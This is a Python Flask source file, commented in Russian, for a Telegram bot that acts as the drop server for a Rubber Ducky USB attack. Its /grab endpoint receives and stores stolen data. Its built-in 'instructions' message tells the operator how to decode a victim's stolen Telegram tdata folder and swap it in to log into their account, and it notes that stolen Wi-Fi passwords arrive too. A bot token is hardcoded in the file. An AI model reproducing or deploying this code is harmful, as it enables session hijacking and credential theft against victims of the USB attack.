from flask import Flask, request, jsonify
import json
import os
from datetime import datetime
import requests

app = Flask(__name__)

# ============================================================
# ТОКЕН БОТА
# ============================================================
TOKEN = "8687718580:AAE_uMnb9CrRBDER8cqi4f-xwzBrcfh_kQM"
TELEGRAM_API = f"https://api.telegram.org/bot{TOKEN}"

# ============================================================
# ПАПКА ДЛЯ ЛОГОВ
# ============================================================
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)

# ============================================================
# ОТПРАВКА СООБЩЕНИЙ В TELEGRAM
# ============================================================
def send_message(chat_id, text, keyboard=None):
    url = f"{TELEGRAM_API}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "Markdown"
    }
    if keyboard:
        payload["reply_markup"] = json.dumps(keyboard)
    requests.post(url, json=payload)

# ============================================================
# КЛАВИАТУРА
# ============================================================
def get_keyboard():
    return {
        "keyboard": [
            ["📊 Логи", "📥 Скачать"],
            ["📖 Инструкция", "🗑️ Очистить"]
        ],
        "resize_keyboard": True,
        "one_time_keyboard": False
    }

# ============================================================
# ОБРАБОТКА ВХОДЯЩИХ СООБЩЕНИЙ (WEBHOOK)
# ============================================================
@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json()
    
    if not data or "message" not in data:
        return "OK", 200
    
    chat_id = data["message"]["chat"]["id"]
    text = data["message"].get("text", "")
    
    if text == "/start":
        send_message(
            chat_id,
            "🪐 **DUCKY BOT**\n\n"
            "Я принимаю данные от Rubber Ducky.\n"
            "Просто отправь POST на `/grab`\n\n"
            "Выбери действие:",
            get_keyboard()
        )
    
    elif text == "📊 Логи":
        files = get_logs()
        if not files:
            send_message(chat_id, "📭 **Нет логов**")
        else:
            msg = "📊 **Логи:**\n\n" + "\n".join(f"📄 `{f}`" for f in files[:10])
            send_message(chat_id, msg)
    
    elif text == "📥 Скачать":
        files = get_logs()
        if not files:
            send_message(chat_id, "📭 **Нет файлов**")
        else:
            path = os.path.join(LOG_DIR, files[0])
            url = f"{TELEGRAM_API}/sendDocument"
            with open(path, 'rb') as f:
                requests.post(url, data={"chat_id": chat_id}, files={"document": f})
    
    elif text == "📖 Инструкция":
        send_message(
            chat_id,
            "📖 **КАК ВОЙТИ В ЧУЖОЙ TELEGRAM**\n\n"
            "1. Rubber Ducky скопирует папку `tdata`\n"
            "2. Найди в логах поле `telegram` — это Base64\n"
            "3. Декодируй:\n"
            "   `echo \"строка\" | base64 -d > tg.zip`\n"
            "4. Распакуй архив\n"
            "5. Замени свою папку:\n"
            "   `%AppData%\\Telegram Desktop\\tdata`\n"
            "6. Запусти Telegram — ты в чужом аккаунте!\n\n"
            "🔑 **Wi-Fi пароли** тоже приходят — ищи поле `wifi`"
        )
    
    elif text == "🗑️ Очистить":
        for f in os.listdir(LOG_DIR):
            os.remove(os.path.join(LOG_DIR, f))
        send_message(chat_id, "✅ **Все логи удалены**")
    
    else:
        send_message(chat_id, "❓ Используй кнопки меню.", get_keyboard())
    
    return "OK", 200

# ============================================================
# ВСПОМОГАТЕЛЬНЫЕ
# ============================================================
def get_logs():
    files = [f for f in os.listdir(LOG_DIR) if f.endswith('.json')]
    return sorted(files, reverse=True)

# ============================================================
# ПРИНИМАЕТ POST ОТ RUBBER DUCKY
# ============================================================
@app.route('/grab', methods=['POST'])
def grab():
    try:
        data = request.get_json()
        if not data:
            data = {"raw": request.get_data(as_text=True)}

        name = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        path = os.path.join(LOG_DIR, name)

        with open(path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)

        print(f"[+] Saved: {name}")
        return jsonify({"status": "OK", "file": name}), 200

    except Exception as e:
        print(f"[-] Error: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/')
def index():
    return "🪐 Ducky Bot is running!"

# ============================================================
# ЗАПУСК
# ============================================================
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
